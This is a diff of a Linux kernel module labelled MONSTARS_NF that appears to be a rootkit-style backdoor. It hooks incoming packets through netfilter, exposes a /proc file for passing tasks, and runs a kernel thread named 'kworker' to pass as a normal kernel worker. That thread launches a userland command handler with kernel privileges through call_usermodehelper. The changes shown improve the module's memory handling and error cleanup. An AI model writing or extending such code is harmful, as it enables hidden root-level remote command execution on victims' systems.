@@ -35,7 +35,7 @@ static struct file_operations s_procfileops;
 
 static struct task_struct *s_kthread = NULL;
 static bool s_task_pending = false;
-static char s_current_task[MAX_DATA_SIZE] = {0};
+static char *s_current_task = NULL;
 
 // Procfile READ callback - reports the stored task to userland
 ssize_t read_callback(struct file* filep, char __user* buf, size_t count, loff_t* ppos)
@@ -143,6 +143,7 @@ int task_thread(void *data)
 {
     char *um_args[] = {(char *)c_user_exe_path, NULL};
     char *um_env[] = {"HOME=/", NULL};
+    int user_ret = 0;
 
     KERNEL_LOG("MONSTARS_NF : Task thread started\n");
 
@@ -153,13 +154,12 @@ int task_thread(void *data)
         {
             // spawn userland cmd handler
             KERNEL_LOG("MONSTARS_NF : Spawning %s\n", c_user_exe_path);
-            if (0 != call_usermodehelper(c_user_exe_path, um_args, um_env, UMH_WAIT_PROC))
-            {
-                KERNEL_LOG("MONSTARS_NF : Usermode helper exec failed\n");
-            }
+            user_ret = call_usermodehelper(c_user_exe_path, um_args, um_env, UMH_WAIT_PROC);
+            KERNEL_LOG("MONSTARS_NF : Usermode helper returned: %d\n", user_ret);
             s_task_pending = false;
         }
     }
+
     KERNEL_LOG("MONSTARS_NF : Task thread terminated\n");
     return 0;
 }
@@ -170,10 +170,16 @@ int __init init_module()
 {
     int retval = 0;
 
-    s_task_pending = false;
+    // Allocate task buffer
+    s_current_task = (char *)kmalloc(MAX_DATA_SIZE, GFP_KERNEL);
+    if (NULL == s_current_task)
+    {
+        KERNEL_LOG("MONSTARS_NF : Could not allocate task buffer!\n");
+        retval = 1;
+        goto cleanup;
+    }
 
-    // Declare and initialize netfilter hook
-
+    // Netfilter hooks
     s_hookops.hook      = (nf_hookfn *) nf_callback;
     s_hookops.hooknum   = NF_INET_PRE_ROUTING;
     s_hookops.pf        = PF_INET;
@@ -186,11 +192,11 @@ int __init init_module()
 #endif
     {
         KERNEL_LOG("MONSTARS_NF : Error registering hook!\n");
-        retval = 1;
+        retval = 2;
+        goto cleanup;
     }
-
-    // Declare and initialize /proc file hook
     
+    // Procfile hooks
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
     s_procfileops.proc_read = read_callback;
     s_procfileops.proc_write = write_callback;
@@ -203,18 +209,28 @@ int __init init_module()
     if (NULL == s_procfile)
     {
         KERNEL_LOG("MONSTARS_NF : Error creating /proc file!\n");
-        retval = 2;
+        retval = 3;
+        goto cleanup;
     }
 
-    // start kthread
-
+    // kthread worker
     s_kthread = kthread_run(task_thread, NULL, "kworker");
     if (NULL == s_kthread)
     {
         KERNEL_LOG("MONSTARS_NF : Error starting kthread!\n");
-        retval = 3;
+        retval = 4;
+        goto cleanup;
     }
-    
+
+cleanup:
+
+    // Free allocation if init was unsuccessful
+    if ((0 != retval) && (NULL != s_current_task))
+    {
+        kfree(s_current_task);
+        s_current_task = NULL;
+    }
+
     KERNEL_LOG("MONSTARS_NF : Module init returned %d\n", retval);
     return retval;
 }
@@ -235,10 +251,17 @@ void __exit cleanup_module()
         proc_remove(s_procfile);
     }
 
-    // stop kthread
+    // Stop kthread
     if (NULL != s_kthread)
     {
         kthread_stop(s_kthread);
+    }
+
+    // Free task buffer
+    if (NULL != s_current_task)
+    {
+        kfree(s_current_task);
+        s_current_task = NULL;
     }
 
     KERNEL_LOG("MONSTARS_NF : Module decharged.\n");
